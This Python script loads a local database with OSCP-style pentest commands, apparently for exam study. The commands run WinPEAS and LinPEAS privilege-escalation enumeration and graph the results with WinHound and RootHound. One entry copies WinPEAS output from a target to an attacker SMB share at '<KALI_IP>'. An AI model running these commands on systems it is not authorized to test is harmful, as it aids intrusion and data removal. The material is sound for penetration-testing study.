#!/usr/bin/env python3
import sqlite3
import os

DB_PATH = os.path.expanduser("~/.oscp_commands.db")

COMMANDS = [
    # tool, description, command, category, tags

    # WinPEAS output capture on target
    ("winpeas", "Save WinPEAS output to file for WinHound analysis",
     "C:\\Windows\\Temp\\winpeas.exe > C:\\Windows\\Temp\\wp.txt 2>&1",
     "privesc-windows", "winpeas,output,file,winhound"),

    ("winpeas", "Save WinPEAS output with color (ANSI) stripped for cleaner parsing",
     "C:\\Windows\\Temp\\winpeas.exe -notcolor > C:\\Windows\\Temp\\wp.txt 2>&1",
     "privesc-windows", "winpeas,output,nocolor,winhound"),

    ("winpeas", "Run WinPEAS and save then transfer via SMB",
     "C:\\Windows\\Temp\\winpeas.exe > C:\\Windows\\Temp\\wp.txt 2>&1 && copy C:\\Windows\\Temp\\wp.txt \\\\<KALI_IP>\\share\\wp.txt",
     "privesc-windows", "winpeas,output,smb,transfer,winhound"),

    # WinHound on Kali
    ("winhound", "Analyze WinPEAS output and generate attack-path graph (online - CDN JS)",
     "python3 ~/oscp/tools/WinHound/WinHound.py <winpeas_output.txt> -o report.html",
     "privesc-windows", "winhound,winpeas,graph,privesc,report"),

    ("winhound", "Analyze WinPEAS output - offline mode (uses RootHound JS files)",
     "python3 ~/oscp/tools/WinHound/WinHound.py <winpeas_output.txt> -o report.html --libdir ~/oscp/tools/RootHound",
     "privesc-windows", "winhound,winpeas,graph,offline,report"),

    ("winhound", "Run WinHound alias (after adding to .zshrc)",
     "winhound <winpeas_output.txt> -o <machinename>_privesc.html",
     "privesc-windows", "winhound,alias,privesc,report"),

    ("winhound", "Open generated WinHound report in browser",
     "xdg-open report.html",
     "privesc-windows", "winhound,report,browser,open"),

    # Full workflow one-liner comment
    ("winhound", "Full WinHound workflow - save on target, download, analyze",
     "# 1. Target: C:\\Windows\\Temp\\winpeas.exe > C:\\Windows\\Temp\\wp.txt\n# 2. Penelope: download C:\\Windows\\Temp\\wp.txt\n# 3. Kali: winhound wp.txt -o report.html && xdg-open report.html",
     "privesc-windows", "winhound,winpeas,workflow,full"),

    # RootHound (Linux equivalent)
    ("roothound", "Analyze LinPEAS output and generate Linux privesc attack-path graph",
     "python3 ~/oscp/tools/RootHound/RootHound.py <linpeas_output.txt> -o report.html",
     "privesc-linux", "roothound,linpeas,graph,privesc,linux,report"),

    ("roothound", "RootHound offline mode (uses local JS files)",
     "python3 ~/oscp/tools/RootHound/RootHound.py <linpeas_output.txt> -o report.html --libdir ~/oscp/tools/RootHound",
     "privesc-linux", "roothound,linpeas,graph,offline,linux"),

    ("roothound", "Save LinPEAS output on Linux target for RootHound",
     "./linpeas.sh | tee /tmp/lp.txt",
     "privesc-linux", "linpeas,output,roothound,tee"),

    ("roothound", "Save LinPEAS output without color for cleaner parsing",
     "./linpeas.sh -a 2>/dev/null | ansi2txt > /tmp/lp.txt",
     "privesc-linux", "linpeas,output,nocolor,roothound"),
]

def main():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    for tool, desc, cmd, cat, tags in COMMANDS:
        c.execute(
            "INSERT INTO commands (tool, description, command, category, tags) VALUES (?,?,?,?,?)",
            (tool, desc, cmd, cat, tags)
        )
    conn.commit()
    conn.close()
    print(f"[+] Inserted {len(COMMANDS)} WinHound/RootHound commands into {DB_PATH}")

if __name__ == "__main__":
    main()
